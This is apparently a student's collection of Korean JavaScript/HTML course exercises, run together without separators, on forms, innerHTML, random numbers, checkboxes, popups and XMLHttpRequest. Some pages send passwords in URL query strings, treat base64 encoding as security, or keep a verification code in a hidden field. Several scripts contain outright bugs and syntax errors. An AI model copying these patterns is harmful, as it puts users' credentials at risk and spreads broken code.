                        var secu3 = btoa(mid);                        
                        location.href="./js_index22.html?biz_id="+secu3+"&biz_pw="+secu2+"&biz_no="+secu1;
                        // location.href="./js_index22.html?biz_id="+mid+"&biz_pw="+mpass+"&biz_no="+secu1;
                    }
                }
            }

        }
    }
</script>
<body>
    <input type="text" id="mid" placeholder="생성할 아이디를 입력하세요"><br>
    <input type="password" id="mpass" placeholder="생성할 패스워드를 입력하세요"><br>
    사업자번호 10자리 입력하세요<br>
    <input type="text" id="no1" maxlength="3" placeholder="3자리"> -
    <input type="text" id="no2" maxlength="2" placeholder="2자리"> -
    <input type="text" id="no3" maxlength="5" placeholder="5자리"><br><br>
    <input type="button" value="사업자 회원등록" onclick="register()">

</body>
</html>
      <!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascript 4일차(javascript html 출력)</title>  <!--back-end는 function을 method란 용어로 사용함-->
    <!--파빌리온 적용-->
    <link rel="shortcut icon" href="#">
    <script src="./js_index23.js?v=1" defer></script> 
    <!-- script src를 이용하여 ***.js 화일을 로드하여 자바스크립트를 적용.단, 'defer'라는 속성을 사용해야 함 -->
</head>
<body>
    <div id="box">
    
    </div>
    <div id="box2">

    </div>
    <ul id="notice">

    </ul><br><br><br>

    <!-- 간단한 innerHTML로 응용 -->
    휴대폰 번호 입력 : <input type="text">  <input type="button"    value="인증받기"   onclick="abc()">
    <span id="scno"></span> 
    <!-- 인증번호를 입력할 수 있는 ui가 적용 -->
</body>
<!-- <script src="./js_index23.js?v=1"></script>  -->
</html>
// console.log("test");
var box =document.getElementById("box");
box.innerText="박스1";
//innerText : 해당id에 문자를 적용할 때 사용하는 명령어

var box2 = document.getElementById("box2");
box2.innerHTML='<input type="text">';
//innerHTML : 문자 이외의 html 태그를 적용할 때 사용하는 명령어


// html 태그와 해당 데이터 변수를 조합, 출력하는 명령어
var notice_data = "[2023-01-19] 시스템점검으로 결재가 되지 않습니다";
var notice = document.getElementById("notice");
notice.innerHTML = "<li>"+ notice_data+"</li>";

function abc(){
    var tel=document.getElementById("tel");
    if(tel.value==""){
        alert("휴대폰번호를 입력하셔야 인증번호 받을수 있어요")
    }
    else{ //휴대폰번호 입력 후 해당 innerHTML명령을 이용해서 input 태그를 생성
        var scno = document.getElementById("scno");
        scno.innerHTML="<input type='text' maxlength='6'> 인증번호 6자리 입력";
    }
}
    
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascript 4일차(javascript 합계구하기(데이터누적)</title>  <!--back-end는 function을 method란 용어로 사용함-->
    <!--파빌리온 적용-->
    <link rel="shortcut icon" href="#">
    <script src="./js_index24.js?v=1" defer></script> 
    <!-- script src를 이용하여 ***.js 화일을 로드하여 자바스크립트를 적용.단, 'defer'라는 속성을 사용해야 함 -->
</head>
<style>
    .notice{
        list-style: none;
        margin: 0;
        padding: 0;
        height: 40px;
    }
</style>
<body>
    <ul id="notice" class="notice"></ul>

    <div id="box">테스트 문자입니다</div>
</body>
</html>
      // console.log("test")
var f;
var sum=0;  //=0 이라는 최초 숫자를 지정하는 이유는 숫자, 불린, 문자 등을 확인할 수가 없기 때문임
for(f=1;f<6;f++){
        //데이터값을 누적시키기 위해 누적되는 변수를 꼭 사용해야 적용됨
    sum=sum+f;  //밑에 row와 동일한 표현
    sum+=f;     //위에 row와 동일한 표현
        //sum=sum-f, sum-=f 의 경우 누적 감소량
}
//console.log(sum);

// 응용문제1. 1~10까지의 모든 숫자를 곱해서 최종 합계를 산출.출력

var v;
var by_sum=1;
for(v=1;v<=10;v++){
    by_sum=by_sum*v;
    console.log(by_sum);
}
console.log(by_sum);

var notice =document.getElementById("notice");
var w=0;
var html ="";
while(w<=9){
    html = "<li>"+w+"</li>";    //해당 li태그와 반복문에 사용하는 값을 누적시킴
    notice.innerHTML+= html;    //이렇게도 사용가능(밖으로 빼낼수도 있고)
    w++;
}
notice.innerHTML = html;        //최종 누적데이터를 notice 아이디 오프젝트에 출력

// innerText, innerHTML 은 할당연산자(대입연산자, +=  -=  /=  *=)를 이용해야 데이터가 누적되면서 사용됨
// 대입연산자가 없을 경우 기존에 있었던 데이터는 삭제됨

document.getElementById("box").innerText+="자바스크립트";
      <!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascript 4일차(javascript 합계구하기(데이터누적)</title>  <!--back-end는 function을 method란 용어로 사용함-->
    <!--파빌리온 적용-->
    <link rel="shortcut icon" href="#">
    <script src="./js_index25.js?v=1" defer></script> 
    <!-- script src를 이용하여 ***.js 화일을 로드하여 자바스크립트를 적용.단, 'defer'라는 속성을 사용해야 함 -->
</head>
<body>
    <!-- submit, reset은 절대 onclick을 사용안함. form onsumit 속성을 이용, 자바스크립트와 연계하여 작업
        return : return true와 동일. 정상적인 결과가 나올 경우 form이 정상 작동 -->
    <form method="get" action="http://naver.com"    onsubmit="return abc()">
        <input type="text" placeholder="검색어" id="search">
        <input type="submit" value="검색" >  <!--onclick="abc()"-->
    </form>
</body>
</html>
      function abc(){
    // alert("검색하세요");
    // return false;
    var sh = document.getElementById("search");
    if(sh.value==""){
        alert("검색어를 입력하셔요");
        return false;       //실패값을 적용. false가 적용시 form이 작동하지 않음. onsubmit에만 사용됨
    }
    else{   //사용자가 정상 입력할 때 form을 활성화시킴
        return;
        return true;  //두개가 같음
    }
}
      <!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascript 4일차(form+submit 메모기능응용편)</title>  <!--back-end는 function을 method란 용어로 사용함-->
    <!--파빌리온 적용-->
    <link rel="shortcut icon" href="#">
    <script src="./js_index26.js?v=1" defer></script> 
    <!-- script src를 이용하여 ***.js 화일을 로드하여 자바스크립트를 적용.단, 'defer'라는 속성을 사용해야 함 -->
</head>
<body>
    댓글내용 :  
    <form method="post" action="http://lovertv.dothome.co.kr/js/memook.php"  onsubmit="return memo()">
        <input type="text" placeholder="댓글을 쓰세요" name="memotext" id="reply">
        <input type="submit" value="등록" >
    </form>
</body>
</html>
      // console.log("ddd");
function memo(){
    var reply = document.getElementById("reply");
    if(reply.value==""){
        alert("댓글을 입력하셔요");
        return false;
    }
    else{
        return ;
        alert("댓글이 등록되었어요")
    }
    
}
// console.log(memo());
      <!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascript 4일차(checkbox + radio)</title> <!--back-end는 function을 method란 용어로 사용함-->
    <!--파빌리온 적용-->
    <link rel="shortcut icon" href="#">
    <script src="./js_index27.js?v=1" defer></script>   <!-- script src를 이용하여 ***.js 화일을 로드하여 자바스크립트를 적용.단, 'defer'라는 속성을 사용해야 함 -->
</head>
<body>
    <!-- id로 해당 checked로 구분하여 확인함. 단, value값은 back-end가 요청할 때 필요, 별도의 요청사항이 없을 경우 value값 미사용 -->
    <input type="checkbox" id="agree" value="Y"> 개인정보 보호정책 동의<br><br>
    <input type="button" value="다음페이지" onclick="cks()"><br><br><br>
    
    <!-- radio는 동의함 부분에만 검토를 하면 됨 -->
    <input type="radio" name="data_ck" id="mail_agree" value="y">동의함
    <input type="radio" name="data_ck" checked value="n">미동의함<br><br>
    <input type="button" value="회원가입" onclick="aks()"><br><br><br>

    <!--a 아이디(무통장입금)를 사용자가 선택 후 결제하기를 클릭하는 경우 javascript 조건문으로 확인함-->
    <input type="radio" name="a" id="a" value="bank"> 무통장입금 <br><br>
    <input type="radio" name="a" value="card" checked> 신용카드 <br><br>
    <input type="radio" name="a" value="hp"> 휴대폰결제 <br><br>
    <input type="radio" name="a" value="gift"> 상품권결제 <br><br>
    <input type="radio" name="a" value="vbank"> 가상계좌입금 <br><br>
    <input type="button" value="결제하기" onclick="pay()"> <br><br>
    
    <!--a 아이디(무통장입금)를 사용자가 선택 시 출력되는 div파트-->
    <div id="div_bank" style="display: none;">  
    <input type="text" id="account" value="NH-123-12-12345"><br>
    <input type="text" id="user_name" value=""><br>
    </div>
</body>
</html>
      function cks(){
    var agree= document.getElementById("agree");
    //console.log(agree.checked);  // true 혹은 false를 뱉어냄
    if(agree.checked==false){
        alert("동의한다고 체크해야 진행됩니다");
    }
    else{
        location.href='http://nate.com';
    }
}

function aks(){
    var mail_agree = document.getElementById("mail_agree");
    if(mail_agree.checked==false){
        alert("메일수신 동의하셔요");
    }
    else{
        location.href="http://naver.com";
    }
}

function pay(){
    var a = document.getElementById("a");
    var div_bank =document.getElementById("div_bank"); //무통장 추가 입력 관련 div 
        
    if(a.checked==true){        //무통장을 선택했을 경우
        div_bank.style.display="block"    ; //css에서 display를 'block'으로 변경
        // alert("ddd test");
    }
    else{
        div_bank.style.display="none" ; //css에서 display를 none 으로 변경
    }
}
      <!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascript 4일차(checkbox + radio)</title> <!--back-end는 function을 method란 용어로 사용함-->
    <!--파빌리온 적용-->
    <link rel="shortcut icon" href="#">
    <script src="./js_index28.js?v=1" defer></script>   <!-- script src를 이용하여 ***.js 화일을 로드하여 자바스크립트를 적용.단, 'defer'라는 속성을 사용해야 함 -->
</head>
<body>
    <select name = "carrier" id="carrier">
        <option value="">통신사선택</option>
        <option value="SKT">SKT</option>
        <option value="KT">KT</option>
        <option value="LGT">LGT</option>
        <option value="etc">알뜰폰</option> //value가 없을 경우, 텍스트 값을 그대로 가져옴. '통신사선택'이 문제가 됨
    </select>
    <input type="button" value="확인" onclick="tel_check()"> <br><br><br>
    
    <input type="text" id="email_1">@<input type="text" id="email_2" readonly>
    <select id="email_3" onchange="mails()">   <!--onchange는 사용자가 즉각 변경 요청할 때 사용되는 속성-->
        <option value="">이메일선택</option>
        <option value="naver.com">네이버</option>
        <option value="nate.com">네이트</option>
        <option value="google.com">구글</option>
        <option value="my">직접입력</option>
    </select>
    <br><br><br>
    
    <!-- this를 이용하여 사용하는 방식 -->
    <input type="text" id="data1">
    <!-- <select id="data2" onchange="test(data)"> -->
        <!-- <option value="">성별선택</option> -->
        <!-- <option value="M">남</option> -->
        <!-- <option value="F">여</option> -->
    
    <!-- this.value : 사용자가 선택한 option에 value값을 지칭 -->
   
    <select onchange="test(this.value)">  
        <option value="">성별선택</option>
        <option value="M">남</option>
        <option value="F">여</option>
    </select>


</body>
</html>
      function tel_check(){
    var carrier = document.getElementById("carrier");
    if(carrier.value==""){
        alert("통신사를 선택해주셔요");
    }
    else{
        alert("연락처를 입력하셔요");
    }
}

function mails(){
    // email_3에서 선택된 값을 email_2로 전달하는 형태.
    var email_3 =document.getElementById("email_3");
    var email_2 =document.getElementById("email_2");
    if(email_3.value != ""){        //!= 는 같지 않다는 논리연산식
        if(email_3.value=="my"){    //my라는value가 선택되는 경우, 
            email_2.readOnly = false;   //readOnly 속성(true false)
            email_2.focus();            //자동으로 해당부분에 커서가 적용됨
        }
        else{
            email_2.readOnly = true;
            email_2.value = email_3.value;  //email_3에 있는 값을 email_2 아이디 값으로 전달하는 내용
        }
    }
    else{
        email_2.value="";       //email_2에 대한 값 초기화
    }
}
// function test(data){
    // var data1 = document.getElementById("data1");
    // data1.value=data; 
// 
// 
// 
    // }
//    
// }

function test(data){   //this.value값을 data라는 인수값으로 받음
    var data1 = document.getElementById("data1");
    data1.value=data;   //해당 인수값을 data1에 적용
}
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascript 4일차(팝업창 index30과 연계)</title> <!--back-end는 function을 method란 용어로 사용함-->
    <!--파빌리온 적용-->
    <link rel="shortcut icon" href="#">
    <script src="./js_index28.js?v=1" defer></script>   <!-- script src를 이용하여 ***.js 화일을 로드하여 자바스크립트를 적용.단, 'defer'라는 속성을 사용해야 함 -->
</head>
<script>
    function popup(){
        window.open("./js_index30.html","","width=500 height=300");
        //window.open은 신규 브라우저 창을 생성할 때 사용
        //"팝업창주소","","팝업창사이즈 외 스크롤 등 조절"
    }
</script>
<body>
    도로명 주소 : <input type="text" id="addr"  readonly>
    <input type="button" value="주소찾기" onclick="popup()">
</body>
</html>
      <!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascript 4일차(팝업창 index29와 연계)</title> <!--back-end는 function을 method란 용어로 사용함-->
    <!--파빌리온 적용-->
    <link rel="shortcut icon" href="#">
    <script src="./js_index28.js?v=1" defer></script>   <!-- script src를 이용하여 ***.js 화일을 로드하여 자바스크립트를 적용.단, 'defer'라는 속성을 사용해야 함 -->
</head>

<body>
    <ul id="address">

    </ul>
</body>

<!-- defer사용시 배열값이 적용되면, inner가 적용 안될수도 음 -->
<script defer>
    var data=["서울시","경기도","인천시","제주도"]; //배열이 있는 경우는 BODY 하단에다가 SCRIPT를 작성해야 함. DEFER가 있던 없던 마찬가지임
    // console.log(data[2])    ; //배열번호를 입력시 콘솔로 해당배열 데이터를 출력
    // console.log(data.length); //배열갯수를 설정해야지 반복문으로 출력가능
    var ea = data.length;
    var f;
    var address = document.getElementById("address"); //html에 해당 아이디를 load
    var html = ""
    for(f=0;f<ea;f++){
        // console.log(data[f]);
        
        
        html+="<li onclick=gopage('"+data[f]+"')>" + data[f]  + "</li>"; //<li></li>태그를 생성하며 onclick 핸들링 속성을 사용하는 형태
    }   // *문자로 인수값을 적용할 경우 "", ''가 있어야 함. 문자는 무조건 따옴표가 없으면 error 발생

        //배열 숫자로 해당함수로 전달
        html+="<li onclick='gopage2("+f+")'>"+data[f]+"</li>";


    
    address.innerHTML=html;  //반복문 결과에 대한 최종 출력

    function gopage(a){  //해당 li를 클릭하는 경우, 부모창(index29)에 값을 전달하는 역할
        var addr=document.getElementById("addr");
        window.opener.addr.value= a;
        self.close();   //자식 창을 자동으로 close
            // alert(a);
    }

    function gopage2(b){
        var addr = document.getElementById("addr");
        window.opener.addr.value = data[b];
        self.close();
    }

</script>
</html>
      <!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascript 5일차(랜덤함수사용법)</title>
    <!--파빌리온 적용-->
    <link rel="shortcut icon" href="#">
    <script src="./js_index31.js?v=2" defer></script>   
    <!-- <link rel="stylesheet" href="./js_test1.css?v=1" type="text/css"> -->
</head>
<style></style>
<body>
    <input type="button" value="랜덤버튼" onclick="abc()"><br><br>
    <input type="button" value="당첨확인" onclick="ab()"><br><br>
    <input type="button" value="당첨확인" onclick="abd()"><br><br>
    <input type="button" value="3개뽑기" onclick="aaa()">

</body>
</html>
      // console.log("dfsfdsf")

function abc(){
    var rdm = Math.random()*10;                 //랜덤함수: 기본 소숫점이 포함 *10은 범위.맥스임
    // var c = Math.ceil(Math.random()*10);     // ceil 올림 1~10
    var c = Math.ceil(Number(rdm));
    // var f = Math.floor(Math.random()*10);    // floor 버림 0~9
    var f = Math.floor(Number(rdm));
    // var r = Math.round(Math.random()*10);    // round 반올림 0.5이상 올림 0~10
    var r = Math.round(Number(rdm));

    console.log(rdm);
    console.log(c);
    console.log(f);
    console.log(r);
}

function ab(){
    // 랜덤으로 당첨결과를 출력하는 코드 작성 1~8
    var game = Math.ceil(Math.random()*8);
    switch(game){
        case 1: case 5:
            console.log("10%할인쿠폰당첨");
        break;
        case 6 :
            console.log("무료택배당첨");
        break;
        case 7 :
            console.log("50%할인쿠폰당첨");
        break;
        default:
            console.log("다음기회에");
        break;
    }
}
function abd(){
    var a = Math.ceil(Math.random()*100);
    if(a==10||a==20||a==30){
        alert("50%할인");
    }
    else if(a>80){
        alert("10%할인");
    }
    else if(a==77){
        alert("금 한돈1kg");
    }
    else{
        alert("꽝");
    }
}
function aaa(){
    var w = 1;
    var no;
    while(w<4){
        no=Math.ceil(Math.random()*10000);
        console.log(no);
        w++;
    }
}
      <!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascript 5일차(랜덤함수응용편)</title>
    <!--파빌리온 적용-->
    <link rel="shortcut icon" href="#">
    <script src="./js_index32.js?v=3" defer></script>   
    <!-- <link rel="stylesheet" href="./js_test1.css?v=1" type="text/css"> -->
</head>
<style>
    .scview{
        width: 200px;
        height: 80px;
        /* border: 1px solid black; */
        border: none;
        box-sizing: border-box;
        background-image: url("./number/security_back.png");
    }
    .scview>span{
        float:left;
        display: block;  /* width, height가 없으면 필요없음*/
    }
</style>
<body>
    <input type="text" id="sno1" readonly>
    <input type="text" id="sno2" readonly>
    <input type="text" id="sno3" readonly>
    <input type="text" id="sno4" readonly>
    <input type="text" id="sno5" readonly>
    <input type="text" id="sno6" readonly>
    <input type="button" value="로또당첨확인" onclick="lotto()">
    <br><br><br>

    <input type="hidden" id="ori_no" value="">
    <!-- <div id="scview" class="scview"> -->
        <!-- <span id="s0"><img src="./number/no0.png"></span> -->
        <!-- <span id="s1"><img src="./number/no1.png"></span> -->
        <!-- <span id="s2"><img src="./number/no3.png"></span> -->
        <!-- <span id="s3"><img src="./number/no4.png"></span> -->
    <!-- </div> -->
    <div id="scview" class="scview">
        <span id="s0"></span>
        <span id="s1"></span>
        <span id="s2"></span>
        <span id="s3"></span>
    </div>
    보여지는 숫자 4자리 입력 : <input type = "text" id="user_no" maxlength="4">
    <input type="button" value="확인" onclick="check_number()">



</body>
</head>
      function lotto(){
   var w=1;
    do{
        lotto=Math.ceil(Math.random()*46);
        document.getElementById("sno"+w).value=lotto;  //id를 순차적으로 적용. 단, id이름을 순차적으로 미생성시 오류발생
        w++
    }while(w<=6)

}

// document.getElementById("s0").innerHTML="<img src='./number/no8.png'>";
var k=0;
var getid;
var rno;
var sum="";
while(k<=3){
    getid =document.getElementById("s"+k);
    rno = Math.floor(Math.random()*10);
    sum+=string(rno);
    getid.innerHTML="<img src='./number/no"+rno+".png'>";
    k++;
}
document.getElementById("ori_no").value = sum; //hidden값에 해당 숫자를 대입함
function check_number(){
    var ori = document.getElementById("ori_no");
    var user = document.getElementById("user_no");
    if(ori.value==user.value){
        alert("정상적으로 확인되었어요");
    }
    else{
        alert("보안코드를 다시 입력하셔요");
        window.location.reload(); //reload : javascript에서 페이지를 새로고침하는 함수
    }
}
        <!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascript 5일차(노드id로 체크박스핸들링)</title>
    <!--파빌리온 적용-->
    <link rel="shortcut icon" href="#">
    <script src="./js_index33.js?v=1" defer></script>   
    <!-- <link rel="stylesheet" href="./js_test1.css?v=1" type="text/css"> -->
</head>
<style>
        
</style>
<body>
    <input type="hidden" id="no" value="0">
    <input type="checkbox" id="all" onclick="allcheck(this.id)">전체선택<br>
    <input type="checkbox" id="sno1" onclick="chk_id(this.id)">상품1<br>
    <input type="checkbox" id="sno2" onclick="chk_id(this.id)">상품2<br>
    <input type="checkbox" id="sno3" onclick="chk_id(this.id)">상품3<br>
    <input type="checkbox" id="sno4" onclick="chk_id(this.id)">상품4<br>
    <input type="checkbox" id="sno5" onclick="chk_id(this.id)">상품5<br>
    <input type="checkbox" id="sno6" onclick="chk_id(this.id)">상품6<br>
    
</body>
</html>
        function chk_id(myid){
    var ck = document.getElementById(myid);
    console.log(ck.checked);
    var no = Number(document.getElementById("no").value);
    if(ck.checked==true){       
        no++;       //1 씩증가하는 방식 3가지 모두 가능
        // no = no+1;
        // no+=1;

    }
    else{
        // 마이너스 1 씩 감소하는 방식
        no--;
    }
    document.getElementById("no").value = no;           //카운팅 : hidden에 +1 씩 카운팅 값을 전달함
    if(document.getElementById("no").value==6){         //hidden값이 6개가 되었을 경우, 전체 선택에 체크가 되고, 
        document.getElementById("all").checked=true;
    }
    else{
        document.getElementById("all").checked=false;   //6미만이 적용되면 전체선택 해제
    }   
}
function allcheck(all){     // 전체선택을 클릭하는 경우, 발생하는 이벤트
    var ea = 6;
    var w = 1;
    var ckall = document.getElementById(all).checked;   //해당체크 유,무 true, false

    while(w<=ea){
        document.getElementById("sno"+w).checked =ckall;
        w++;
    }

    if(ckall==true){            //전체 선택할 경우 아래에 있는 객체의 갯수만큼 hidden 값에 반영
        document.getElementById("no").value = 6;
    }
    else{
        document.getElementById("no").value = 0;
    }

    // if(ckall==true){
        // while(w<=ea){
            // document.getElementById("sno"+w).checked =true;
            // w++;
        // }
    // }
    // else{
        // while(w<=ea){
            // document.getElementById("sno"+w).checked =false;
            // w++;
        // }
    // }
}
        <!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascript 5일차(약관동의 응용부분)</title>
    <!--파빌리온 적용-->
    <link rel="shortcut icon" href="#">
    <script src="./js_index34.js?v=1" defer></script>   
    <!-- <link rel="stylesheet" href="./js_ijs_test1.css?v=1" type="text/css"> --> 
</head>
<style>
    body{
        margin: 10px ; padding: 10px ;
    }
    .msg_agree{
        width: 300px;
        height: 100px;
        margin-top: 20px;
        /* margin-right: 20% */
        /* background-color: gray; */
        /* color: white; */
    }
</style>
<body>
    
    <textarea id="msg_agree" class="msg_agree" readonly></textarea>
    
    <div id="view" style="width: 600px; height: 100px;
     border: 1px solid black; overflow-y: auto;"> 
        <!-- overflow-y:auto 세로 스크롤바 생성. div를 넘어서는 부분때문에 -->
    </div>
    


    싸이트(<a href="http://www.nate.com" id="a()"> 네이트</a>)는 <br>
</body>
        var msg_agree = document.getElementById("msg_agree");

var http = new XMLHttpRequest();        //http, https를 통해서 통신할 때 사용되는 함수. 통신의 시작을 일컬음
http.open("get","./agree.txt?v=1",false);   //open("전송방식","화일명 또는 url 주소",false동기화 또는 true비동기화)
http.send();                            //send : 통신에 대한 대기 상황을 일컬음

//텍스트 화일load
msg_agree.value = http.responseText;    //responseText : 응답요청값을 텍스트로 출력(html태그를 직접가져옴. 대신 responseHTML은 사라짐)     response : 배열값으로 받음      responseHTML : html로 코드를 읽어옴 reponseXML : XML을 직접 가져옴

//html 화일load
document.getElementById("view").innerHTML = http.responseText;




//통신 : 200(통신성공)  401(접근권한없음)   402(웹페이지오류.필수메소드없음 get post 없을때)   403(웹페이지 접근권한없음)   404(화일못찾을경우,웹페이지가없을경우)
// 500(서버관련오류)    500() 501() 502() 503() 504()
        body{
    margin 0 ; padding 0 ;
}
.t1{
    width: 800px;   height: 200px;
}
.r1{
    width: 200px;   height: 20px;
    margin-left: auto;
}
.r2{
    width: 50px;   height: 20px;
    margin-left: 10px;
}
.t2{
    width: 800px;   height: 100px;
}
.t3{
    width: 800px;   height: 100px;
}

        <!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascript 5일차(약관동의 응용부분)</title>
    <!--파빌리온 적용-->
    <link rel="shortcut icon" href="#">
    <script src="./js_index35.js?v=3" defer></script>   
    <link rel="stylesheet" href="./js_index35.css?v=1" type="text/css"> 
</head>
<body>
    <labela class="lbl1">
    <textarea id="t1" class="t1" readonly></textarea><br>
        <div class="r1">
            <input type="checkbox"  id="r1" onclick="r1()">동의함
            <input type="checkbox"  id="r2" onclick="r2()">동의하지않음
        </div>
    </label><br><br><br>
        
    <div id="t2" class="t2" style=" width: 800px; height: 200px; border: 1px solid black; overflow-y: auto;"></div>
        <div class="r1">
            <input type="checkbox" id="r3" onclick="r3()">동의함
            <input type="checkbox" id="r4" onclick="r4()">동의하지않음
        </div><br><br><br>
        
    <div id="t3" class="t3" style=" width: 800px; height: 200px; border: 1px solid black; overflow-y: auto;"></div>
        <div class="r1">
            <input type="checkbox" id="r5" onclick="r5()" >동의함
            <input type="checkbox" id="r6" onclick="r6()">동의하지않음
        </div><br><br><br>

    <input type="checkbox" id="r7" class="r2" onclick="r7()"> 전체 동의함
    
</body>
</html>
        var t1 = document.getElementById("t1");
var http1 = new XMLHttpRequest();
http1.open("get","./service.txt?v=1",false);
http1.send();
t1.value = http1.responseText;

var t2 = document.getElementById("t2");
var http2 = new XMLHttpRequest();
http2.open("get","./info.txt?v=1",false);
http2.send();
document.getElementById("t2").innerHTML = http2.responseText;

var t3 = document.getElementById("t3");
var http3 = new XMLHttpRequest();
http3.open("get","./avinfo.txt?v=1",false);
http3.send();
document.getElementById("t3").innerHTML = http3.responseText;

function r1(){
    var check_r1 = document.getElementById("r1");
    if(check_r1.checked = true;){
        
    }
    // if(check_r1.checked=true){
        // alert("첵!");
        // console.log(check_r1);
    // }
    // else{
        // alert ("오마이");
    // }
    

    // if(r1().document.getElementById().checked=true){
        // alert("동의했슴돠");
    // }
}


          
          
 <!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascript 4일차(팝업창 index30과 연계)</title>
    <!--파빌리온 적용-->
    <link rel="shortcut icon" href="#">
    <script src="./js_test1.js?v=2" defer></script>
    <link rel="stylesheet" href="./js_test1.css?v=1" type="text/css">
</head>
<body>
<input type="text" id="person_nm" class="box_type1" placeholder="고객 이름 입력하셔요"><br><br>
<input type="text" id="person_tel" class="box_type1" placeholder="연락처를 입력하세요"><br><br>
<input type="text" id="person_email1" placeholder="이메일주소" class="box_type2">@<input type="text" id="person_email2" placeholder="이메일주소명" class="box_type2"><br><br>
<textarea id="person_text" placeholder="질문내용" class="box_type3"></textarea><br>
<input type="checkbox" id="person_agree"> 개인정보 제공에 동의<br><br>
<input type="button" value="메일보내기" onclick="send_mail()" class="box_type4"> 
</body>
</html>
          



function send_mail(){
    var person_nm = document.getElementById("person_nm") ;
    var person_tel = document.getElementById("person_tel") ;
    var person_email1 = document.getElementById("person_email1") ;
    var person_email2 = document.getElementById("person_email2") ;
    var person_text = document.getElementById("person_text") ;
    var person_agree = document.getElementById("person_agree") ;

    var person_email = person_email1.value+"@"+person_email2.value ;

    console.log(person_nm.value);
    console.log(person_tel.value);
    console.log(person_email1.value);
    console.log(person_email2.value);
    
    console.log(person_email);
    console.log(person_text.value);
    console.log(person_agree.value);
    console.log(person_agree.checked);


    // if(person_nm==""){
        // alert("고객명을 입력해주세요");
    // }
    // else{
    // 
    // }



    // console.log(person_nm)

   location.href="http://mekeyace.kbsn.or.kr/mailpost.php";
}

body{
    margin: 10px; padding: 10px;
}
.box_type1{
    width: 400px;
    height: 30px;
    /* background-color: blue; */
}
.box_type2{
    width: 185px;
    height: 30px;
    /* position: relative; */
    /* background-color: blue;  */
    /* color: white;    */
    /* border: 0px; */
}
.box_type3{
    width: 400px;
    height: 300px;
}
.box_type4{
    width: 400px;
    height: 30px;
    background-color: blue; 
    color: white;
    border: 0px;
}
.box_type21{
    position: absolute;
    right: 220%;
}


<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Javascript 3일차 - Javascript location통신 응용편</title>
    <!-- 파빌리온 적용 -->
    <link rel="shortcut icon" href="#">
</head>
<script>
    function register(){
        var mid = document.getElementById("mid").value;
        var mpass = document.getElementById("mpass").value;
        var mno = document.getElementById("no1").value + 
                  document.getElementById("no2").value +
                  document.getElementById("no3").value;
        
        /* console.log(mid);
        console.log(mpass);
        console.log(mno); */
        
        if(mid.length < 5){
            alert("아이디는 최소 5자 이상 입력되어야 합니다.")
        }
        else{
            if(mpass.length < 4){
            alert("패스워드는 최소 4자 이상 입니다.")
            }
            else{
                if(mno.length < 10){
                    alert("사업자번호는 총 10자리 숫자 입니다.")
                }
                else{
                    if(isNaN(Number(mno))){
                        alert("사업자번호는 숫자만 입력해야 합니다.")
                    }
                    else{
                        location.href="http://hyuk313.dothome.co.kr/js/js_index21.html?biz_id="+mid+"&biz_pw="+mpass+"&biz_no="+mno;
                    }
                }
            }

        }
    }
</script>
<body>
    <input type="text" id="mid" placeholder="생성할 아이디를 입력하세요"><br>
    <input type="password" id="mpass" placeholder="생성할 패스워드를 입력하세요"><br>
    사업자번호 10자리 입력하세요<br>
    <input type="text" id="no1" maxlength="3" placeholder="3자리"> -
    <input type="text" id="no2" maxlength="2" placeholder="2자리"> -
    <input type="text" id="no3" maxlength="5" placeholder="5자리"><br><br>
    <input type="button" value="사업자 회원등록" onclick="register()">

</body>
</html>
          
          <!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Javascript 3일차 - Javascript location통신 응용편</title>
    <!-- 파빌리온 적용 -->
    <link rel="shortcut icon" href="#">
</head>
